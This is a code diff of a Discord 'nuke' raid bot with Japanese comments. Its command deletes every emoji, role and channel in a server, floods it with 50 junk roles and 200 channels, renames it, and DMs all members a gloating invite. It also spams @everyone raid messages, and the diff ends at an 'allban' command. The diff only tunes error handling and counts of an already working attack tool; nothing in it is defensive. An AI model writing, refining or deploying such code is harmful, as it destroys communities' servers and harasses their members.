@@ -4,7 +4,6 @@ import asyncio
 import aiohttp
 import random
 import os
-from datetime import datetime, timedelta
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -28,9 +27,9 @@ async def masumani(ctx):
     channel_name = 'ますまに共栄圏最強'
     channel_count = 200
     spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
-    spam_count = 10  # 500から10に変更（現実的な数）
+    spam_count = 10
     role_name = 'ますまに共栄圏に荒らされましたww'
-    role_count = 100
+    role_count = 50
 
     await ctx.message.delete()
     guild = ctx.guild
@@ -39,14 +38,16 @@ async def masumani(ctx):
 
     await user.send('処理を開始します')
 
-    # 1. 絵文字削除（並列）
-    emoji_delete_tasks = [emoji.delete() for emoji in guild.emojis]
-    emoji_delete_results = await asyncio.gather(*emoji_delete_tasks, return_exceptions=True)
-    emoji_deleted = sum(1 for r in emoji_delete_results if not isinstance(r, Exception))
-    await user.send(f'絵文字削除: {emoji_deleted}個')
+    # 1. 絵文字削除
+    try:
+        emoji_delete_tasks = [emoji.delete() for emoji in guild.emojis]
+        emoji_delete_results = await asyncio.gather(*emoji_delete_tasks, return_exceptions=True)
+        emoji_deleted = sum(1 for r in emoji_delete_results if not isinstance(r, Exception))
+        await user.send(f'絵文字削除: {emoji_deleted}個')
+    except Exception as e:
+        await user.send(f'絵文字削除失敗')
 
-    # 待機
-    await asyncio.sleep(1)
+    await asyncio.sleep(2)
 
     # アイコンダウンロード
     icon_bytes = None
@@ -58,155 +59,133 @@ async def masumani(ctx):
     except:
         pass
 
-    # 2. 絵文字作成（バッチ処理）
-    emoji_created = 0
-    if icon_bytes:
-        try:
-            max_emojis = guild.emoji_limit
-            for i in range(0, max_emojis, 5):
-                batch = min(5, max_emojis - i)
-                emoji_tasks = [guild.create_custom_emoji(name=f'emoji{i+j}', image=icon_bytes) for j in range(batch)]
-                emoji_results = await asyncio.gather(*emoji_tasks, return_exceptions=True)
-                emoji_created += sum(1 for r in emoji_results if not isinstance(r, Exception))
-                await asyncio.sleep(0.5)
-        except:
-            pass
-    await user.send(f'絵文字作成: {emoji_created}個')
+    # 2. ロール削除
+    try:
+        roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed]
+        role_deleted = 0
+        for i in range(0, len(roles_to_delete), 10):
+            batch = roles_to_delete[i:i+10]
+            role_delete_tasks = [role.delete() for role in batch]
+            role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
+            role_deleted += sum(1 for r in role_delete_results if not isinstance(r, Exception))
+            await asyncio.sleep(0.5)
+        await user.send(f'ロール削除: {role_deleted}個')
+    except Exception as e:
+        await user.send(f'ロール削除失敗')
 
-    # 待機
-    await asyncio.sleep(1)
+    await asyncio.sleep(2)
 
-    # 3. ロール削除（バッチ処理）
-    roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed]
-    role_deleted = 0
-    for i in range(0, len(roles_to_delete), 10):
-        batch = roles_to_delete[i:i+10]
-        role_delete_tasks = [role.delete() for role in batch]
-        role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
-        role_deleted += sum(1 for r in role_delete_results if not isinstance(r, Exception))
-        await asyncio.sleep(0.5)
-    await user.send(f'ロール削除: {role_deleted}個')
+    # 3. ロール作成
+    try:
+        role_created = 0
+        for i in range(0, role_count, 5):
+            batch = min(5, role_count - i)
+            role_tasks = []
+            for j in range(batch):
+                color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
+                role_tasks.append(guild.create_role(name=role_name, color=color))
+            role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
+            role_created += sum(1 for r in role_results if not isinstance(r, Exception))
+            await asyncio.sleep(2)
+        await user.send(f'ロール作成: {role_created}個')
+    except Exception as e:
+        await user.send(f'ロール作成失敗')
 
-    # 待機
-    await asyncio.sleep(1)
+    await asyncio.sleep(2)
 
-    # 4. ロール作成（バッチ処理）
-    role_created = 0
-    for i in range(0, role_count, 10):
-        batch = min(10, role_count - i)
-        role_tasks = []
-        for j in range(batch):
-            color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
-            role_tasks.append(guild.create_role(name=role_name, color=color))
-        role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
-        role_created += sum(1 for r in role_results if not isinstance(r, Exception))
-        await asyncio.sleep(0.5)
-    await user.send(f'ロール作成: {role_created}個')
+    # 4. DM送信
+    try:
+        async def send_dm(member):
+            try:
+                await member.send(f'{old_server_name}を破壊しました https://discord.gg/DCKWUNfEA5')
+                return 1
+            except:
+                return 0
 
-    # 5. DM送信（並列）
-    async def send_dm(member):
-        try:
-            await member.send(f'{old_server_name}を破壊しました https://discord.gg/DCKWUNfEA5')
-            return 1
-        except:
-            return 0
+        dm_tasks = [send_dm(m) for m in guild.members if not m.bot]
+        dm_results = await asyncio.gather(*dm_tasks, return_exceptions=True)
+        dm_count = sum(r for r in dm_results if not isinstance(r, Exception))
+        await user.send(f'DM送信完了: {dm_count}人')
+    except Exception as e:
+        await user.send(f'DM送信失敗')
 
-    dm_tasks = [send_dm(m) for m in guild.members if not m.bot]
-    dm_results = await asyncio.gather(*dm_tasks, return_exceptions=True)
-    dm_count = sum(r for r in dm_results if not isinstance(r, Exception))
-    await user.send(f'DM送信完了: {dm_count}人')
+    await asyncio.sleep(2)
 
-    # 6. アイコン・サーバー名変更
+    # 5. アイコン・サーバー名変更
     try:
         if icon_bytes:
             await guild.edit(name=new_server_name, icon=icon_bytes)
         else:
             await guild.edit(name=new_server_name)
         await user.send('サーバー設定変更完了')
-    except:
-        pass
+    except Exception as e:
+        await user.send('サーバー設定変更失敗')
 
-    # 7. イベント作成（30個並列）
-    event_tasks = []
-    start_time = datetime.now()
-    end_time = start_time + timedelta(days=365)
-
-    for i in range(30):
-        try:
-            event_tasks.append(guild.create_scheduled_event(
-                name='ますまに共栄圏最強！',
-                description='場所はhttps://discord.gg/DCKWUNfEA5',
-                start_time=start_time,
-                end_time=end_time,
-                location='https://discord.gg/DCKWUNfEA5',
-                entity_type=discord.EntityType.external,
-                privacy_level=discord.PrivacyLevel.guild_only,
-                image=icon_bytes if icon_bytes else None
-            ))
-        except:
-            pass
-
-    event_results = await asyncio.gather(*event_tasks, return_exceptions=True)
-    event_created = sum(1 for r in event_results if not isinstance(r, Exception))
-    await user.send(f'イベント作成: {event_created}個')
-
-    # 8. チャンネル削除（バッチ処理）
-    channels_to_delete = list(guild.channels)
-    deleted_count = 0
-    for i in range(0, len(channels_to_delete), 10):
-        batch = channels_to_delete[i:i+10]
-        channel_delete_tasks = [channel.delete() for channel in batch]
-        channel_delete_results = await asyncio.gather(*channel_delete_tasks, return_exceptions=True)
-        deleted_count += sum(1 for r in channel_delete_results if not isinstance(r, Exception))
-        await asyncio.sleep(0.5)
-    await user.send(f'チャンネル削除: {deleted_count}個')
-
-    # 待機
     await asyncio.sleep(2)
 
-    # 9. チャンネル作成（バッチ処理）
+    # 6. チャンネル削除
+    try:
+        channels_to_delete = list(guild.channels)
+        deleted_count = 0
+        for i in range(0, len(channels_to_delete), 10):
+            batch = channels_to_delete[i:i+10]
+            channel_delete_tasks = [channel.delete() for channel in batch]
+            channel_delete_results = await asyncio.gather(*channel_delete_tasks, return_exceptions=True)
+            deleted_count += sum(1 for r in channel_delete_results if not isinstance(r, Exception))
+            await asyncio.sleep(0.5)
+        await user.send(f'チャンネル削除: {deleted_count}個')
+    except Exception as e:
+        await user.send(f'チャンネル削除失敗')
+
+    await asyncio.sleep(2)
+
+    # 7. チャンネル作成
     created_channels = []
     created_count = 0
-    for i in range(0, channel_count, 5):
-        batch = min(5, channel_count - i)
-        channel_tasks = [guild.create_text_channel(name=channel_name) for j in range(batch)]
-        channel_results = await asyncio.gather(*channel_tasks, return_exceptions=True)
-        for r in channel_results:
-            if not isinstance(r, Exception):
-                created_channels.append(r)
-                created_count += 1
-        await asyncio.sleep(1)
-    await user.send(f'チャンネル作成: {created_count}個')
+    try:
+        for i in range(0, channel_count, 5):
+            batch = min(5, channel_count - i)
+            channel_tasks = [guild.create_text_channel(name=channel_name) for j in range(batch)]
+            channel_results = await asyncio.gather(*channel_tasks, return_exceptions=True)
+            for r in channel_results:
+                if not isinstance(r, Exception):
+                    created_channels.append(r)
+                    created_count += 1
+            await asyncio.sleep(1)
+        await user.send(f'チャンネル作成: {created_count}個')
+    except Exception as e:
+        await user.send(f'チャンネル作成失敗: {created_count}個作成済み')
 
     await asyncio.sleep(2)
 
-    # 10. メッセージ送信（大幅に制限）
-    await user.send('メッセージ送信中...')
+    # 8. メッセージ送信
+    try:
+        await user.send('メッセージ送信中...')
 
-    # spam_countを10に減らす（500は多すぎる）
-    limited_spam_count = 10
+        async def spam_channel_limited(channel):
+            count = 0
+            for i in range(spam_count):
+                try:
+                    await channel.send(spam_message)
+                    count += 1
+                    await asyncio.sleep(1)
+                except:
+                    pass
+            return count
 
-    async def spam_channel_limited(channel):
-        count = 0
-        for i in range(limited_spam_count):
-            try:
-                await channel.send(spam_message)
-                count += 1
-                await asyncio.sleep(1)  # 1秒待機
-            except:
-                pass
-        return count
+        total_messages = 0
+        for i in range(0, len(created_channels), 5):
+            batch = created_channels[i:i+5]
+            spam_tasks = [spam_channel_limited(ch) for ch in batch]
+            spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
+            total_messages += sum(r for r in spam_results if not isinstance(r, Exception))
+            await asyncio.sleep(2)
 
-    # 5チャンネルずつ処理
-    total_messages = 0
-    for i in range(0, len(created_channels), 5):
-        batch = created_channels[i:i+5]
-        spam_tasks = [spam_channel_limited(ch) for ch in batch]
-        spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
-        total_messages += sum(r for r in spam_results if not isinstance(r, Exception))
-        await asyncio.sleep(2)
+        await user.send(f'完了 メッセージ送信: {total_messages}件')
+    except Exception as e:
+        await user.send(f'メッセージ送信失敗')
 
-    await user.send(f'完了 メッセージ送信: {total_messages}件')
+    await user.send('全処理完了')
 
 @bot.command()
 async def allban(ctx):
